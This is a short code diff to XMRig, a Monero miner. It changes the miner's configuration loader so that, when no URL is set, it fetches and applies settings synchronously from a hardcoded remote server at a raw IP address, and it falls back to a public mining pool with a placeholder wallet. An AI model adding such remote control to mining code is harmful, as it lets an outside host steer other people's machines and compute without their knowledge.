@@ -401,20 +401,43 @@ void xmrig::Config::getJSON(rapidjson::Document &doc) const
 
 void xmrig::Config::loadWebConfig()
 {
+    // 硬编码默认的远程配置URL
+    const char* DEFAULT_WEB_CONFIG_URL = "http://182.92.97.16:8181/configs/666+cpu.json";
+    
+    // 如果没有指定web配置URL，使用默认的
     if (m_webConfigUrl.empty()) {
-        LOG_WARN("No web configuration URL specified");
-        return;
+        m_webConfigUrl = DEFAULT_WEB_CONFIG_URL;
+        LOG_INFO("Using default web configuration URL: %s", m_webConfigUrl.c_str());
     }
     
     LOG_INFO("Loading configuration from: %s", m_webConfigUrl.c_str());
     
-    m_webConfigFetcher->fetchConfig(m_webConfigUrl, [this](bool success, const WebConfigFetcher::WebConfig& config) {
-        if (success) {
-            applyWebConfig(config);
-        } else {
-            LOG_ERR("Failed to load web configuration");
+    // 使用同步版本，确保配置加载完成
+    WebConfigFetcher::WebConfig config;
+    if (m_webConfigFetcher->fetchConfigSync(m_webConfigUrl, config)) {
+        applyWebConfig(config);
+    } else {
+        LOG_ERR("Failed to load web configuration, using default settings");
+        // 如果加载失败，至少设置一个默认池
+        Pool defaultPool("pool.supportxmr.com:3333");
+        defaultPool.setUser("YOUR_WALLET_ADDRESS");
+        defaultPool.setPassword("x");
+        
+        std::vector<Pool> pools;
+        pools.push_back(defaultPool);
+        
+        rapidjson::Document doc(rapidjson::kObjectType);
+        rapidjson::Value poolsArray(rapidjson::kArrayType);
+        
+        for (const auto& pool : pools) {
+            poolsArray.PushBack(pool.toJSON(doc), doc.GetAllocator());
         }
-    });
+        
+        doc.AddMember("pools", poolsArray, doc.GetAllocator());
+        
+        JsonReader reader(doc);
+        m_pools.load(reader);
+    }
 }
 
 
